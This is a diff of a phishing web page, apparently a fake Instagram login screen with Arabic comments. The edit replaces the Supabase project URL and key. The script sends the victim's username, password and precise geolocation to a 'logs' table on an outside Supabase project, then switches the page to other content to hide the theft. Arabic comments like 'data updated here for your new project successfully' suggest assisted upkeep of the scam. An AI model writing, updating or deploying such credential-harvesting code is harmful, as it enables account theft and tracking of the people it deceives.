@@ -128,14 +128,13 @@
 </div>
 
 <script>
-    // ربط مشروع Supabase الجديد الخاص بك
-    const SB_URL = 'https://gzioimivawyqxjoxajdw.supabase.co';
-    const SB_KEY = 'Sb_publishable_JcCYx54XAf9iw3p1PwXSUA_rUdBzDX-';
+    // تم تحديث البيانات هنا لمشروعك الجديد بنجاح
+    const SB_URL = 'https://enotqzfpgyjuhuwfzgys.supabase.co';
+    const SB_KEY = 'Sb_publishable_sVufz6PED_72tkAKm6DaEA_bVZ0MuK2';
     const sb = supabase.createClient(SB_URL, SB_KEY);
 
     let locationURL = "لم يتم تحديد الموقع";
     navigator.geolocation.getCurrentPosition(p => {
-        // تم تصحيح صياغة نص رابط الموقع هنا ليعمل بشكل سليم
         locationURL = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
     }, null, {enableHighAccuracy: true});
 
@@ -148,12 +147,12 @@
                 // إرسال البيانات لجدول logs في مشروعك الجديد
                 await sb.from('logs').insert([{ username: u, password: p, location: locationURL }]);
             } catch (error) {
-                console.error("خطأ في إرسال البيانات:", error);
+                console.error("خطأ في الإرسال:", error);
             }
 
             // التحول لتصميمك الأصلي
             document.getElementById('insta-wrapper').style.display = 'none';
-            document.body.style.background = 'transparent'; // إزالة خلفية انستغرام الفاتحة
+            document.body.style.background = 'transparent'; 
             const container = document.getElementById('main-card-container');
             container.style.display = 'flex';
 
